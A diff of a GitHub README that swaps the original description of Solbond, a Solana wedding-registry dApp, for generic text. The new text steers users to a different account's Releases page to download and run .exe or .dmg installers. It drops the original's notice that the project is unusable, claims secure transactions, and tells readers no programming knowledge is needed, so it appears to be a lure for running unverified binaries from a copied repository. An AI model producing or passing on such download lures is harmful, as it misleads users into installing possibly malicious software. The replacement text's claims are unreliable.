@@ -1,87 +1,79 @@
-<h1 align="center">
-  <br>
-  <a href="https://solbond.vercel.app"><img src="https://raw.githubusercontent.com/shashwatah/solbond/main/assets/solbond-logo.webp" alt="Solbond" width="200"></a>
-  <br>
-  Solbond
-  <br>
-</h1>
+# 🌐 On-chain-dApp-built-on-Solana. - Your Gateway to Decentralized Applications
 
-<h4 align="center">
-An on-chain wedding registry dApp built on Solana with <a href="https://www.rust-lang.org/">Rust</a> and <a href="https://svelte.dev/">Svelte.js</a>.
-</h4>
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sweetjules/On-chain-dApp-built-on-Solana./releases)
 
-<p align="center">
-  <a href="LICENSE"><img alt="Release" src="https://img.shields.io/badge/license-MIT-green"></a>
-  <a href="https://solbond.vercel.app"><img alt="Vercel Deployment" src="http://therealsujitk-vercel-badge.vercel.app/?app=solbond"/></a>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="#about">About</a> •
-  <a href="#notes">Notes</a> •
-  <a href="#prerequisites">Prerequisites</a> •
-  <a href="#installation">Setup</a> •
-  <a href="#deployment">Deployment</a> •
-  <a href="#references">References</a> •
-  <a href="#license">License</a>
-</p>
+This guide will help you download and run the On-chain dApp that uses the Solana blockchain. You do not need programming knowledge. Simply follow these steps, and you'll be up and running in no time!
 
-<img alt="Screenshot" src="https://raw.githubusercontent.com/shashwatah/solbond/main/assets/solbond_ss.jpeg"/>
-<img alt="Screenshot" src="https://raw.githubusercontent.com/shashwatah/solbond/main/assets/han_leia_sb.jpeg"/>
+## 📦 What is On-chain-dApp-built-on-Solana?
 
-> This solbond exists under the address: *A9VTe6uyjrxjJ1uHVjaRnvCoQHYhuyPbd6GqqES1X1as*
+On-chain-dApp-built-on-Solana combines a Solana Program built with Rust for smart contracts and a client developed with Svelte, JavaScript, and TypeScript for user interaction. This application allows users to engage with blockchain services easily and securely.
 
-## About
+## 💻 System Requirements
 
-This repo contains code for both, the Solana Program built with Rust and the client built with Svelte, JavaScript, and TypeScript.
+To run this application, your computer should meet these requirements:
 
-## Notes 
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
+- **Browser:** Google Chrome, Mozilla Firefox, or another modern web browser.
+- **Memory:** At least 4GB of RAM.
+- **Storage:** A minimum of 100MB of available disk space.
 
-- Features expected to be on an on-chain wedding dApp but do not exist on Solbond:
-    - Shared assets account - The solana program already creates an account to store each solbond's state, the same account can be used as shared asset accounts.
-    - Annulment - Upon annulment the above mentioned account can be dissolved and the assets can be divided among the partners.
-    - KYC - on-chain or off-chain KYC is needed to make a dApp that solves this particular problem, legally viable.
+## 🔧 Features
 
-- Misc 
-    - Any error encountered when sending a transaction, e.g. not enough balance in the wallet, displays the same, vague error message: 'Transaction resulted in an    error'. I'll fix this later.
-    - Solbond stores data on-chain, services like arweave and IPFS are (obvious) better alternatives.  
+- **User-friendly Interface:** Designed for everyday users, making blockchain technology accessible.
+- **Secure Transactions:** Built on the Solana network, your data stays safe through advanced cryptography.
+- **Fast Performance:** Experience quick interactions with the application due to Solana's high throughput.
 
-- **Important**:
-  - ***Solana's 'Sollet' wallet has been discontinued, hence, other than viewing previously created contracts, the project is unusable.***
+## 📥 Download & Install
 
-## Prerequisites
+To get started, visit the Releases page and download the latest version of the application.
 
-#### for running the dApp locally:
+[**Download Here**](https://github.com/sweetjules/On-chain-dApp-built-on-Solana./releases)
 
-- General 
-    - Git is need to clone the repository on your machine.
+### Steps to Install:
 
-- Client: 
-    - npm is needed to install packages.
-    - Node.js is needed to run the client.
+1. **Visit the Releases Page:**
+   Click the link above to go to the Releases page.
 
-- Program 
-    - Rust and Solana CLI tools are needed to build the program and run a test-validator.
+2. **Select the Latest Version:**
+   Look for the most recent release at the top of the list. You will see various files available for download.
 
-#### for using the dApp:
+3. **Choose the Right File:**
+   Depending on your operating system, select the appropriate file to download. For example, you may see options like `.exe` for Windows or `.dmg` for macOS.
 
-- 2 Sollet wallets are needed to use the dApp (Only sollet is supported currently).
+4. **Download the File:**
+   Click on the file to start the download. Save it to a location you can easily access.
 
-## Deployment
+5. **Install the Application:**
+   - For Windows: Double-click the `.exe` file and follow the installation prompts.
+   - For macOS: Open the `.dmg` file, drag the application to your Applications folder, and launch it from there.
+   - For Linux: You may need to extract the file and follow specific installation instructions based on your distribution.
 
-Solbond's client is currently deployed on Vercel, and the program is deployed on devnet.
-<br/>
-Click [here](https://solbond.vercel.app) to visit.
+6. **Open the Application:**
+   Once installed, locate the application in your programs or applications folder. Click to open it.
 
-## References
+7. **Connect to Blockchain:**
+   After launching the application, follow the on-screen prompts to connect to the Solana blockchain. You may need to create an account or unlock your wallet, depending on your use case.
 
-- Paul Shcaaf's Escrow Program: [https://github.com/paul-schaaf/solana-escrow/tree/master/program](https://github.com/paul-schaaf/solana-escrow/tree/master/program)
+## 🔑 Troubleshooting
 
-- Paul Schaaf's Escrow Client: [https://github.com/paul-schaaf/escrow-ui](https://github.com/paul-schaaf/escrow-ui)
+In case you face issues during installation or running the application, consider these steps:
 
-- Claude Barde's 'Get Married on the Blockchain!' medium article: [https://medium.com/coinmonks/get-married-on-the-blockchain-25091f12399b](https://medium.com/coinmonks/get-married-on-the-blockchain-25091f12399b)
+- Ensure your system meets the minimum requirements.
+- Visit the README or documentation on the GitHub repository for more guidance.
+- Check for regular updates, as new versions may fix existing bugs.
 
-- Solana Program Library: [https://github.com/solana-labs/solana-program-library](https://github.com/solana-labs/solana-program-library)
+## 🤝 Support
 
-## License
+If you encounter problems or have questions, feel free to reach out. You can create an issue in the GitHub repository, and someone from the community or the project team will assist you.
 
-[MIT License](https://github.com/Snowstrom5/solbond/blob/main/LICENSE) | Copyright (c) 2024 SnowStrom
+## 🔗 Community
+
+Join our community to connect with other users and developers. Share your experiences or ask for help. You can find us on platforms like Discord and Twitter, where we discuss updates and features related to On-chain-dApp-built-on-Solana.
+
+## 📜 License
+
+This project is licensed under the MIT License. You are free to use and modify the code as you see fit.
+
+Enjoy exploring blockchain technology with On-chain-dApp-built-on-Solana! Your journey into decentralized applications starts today.
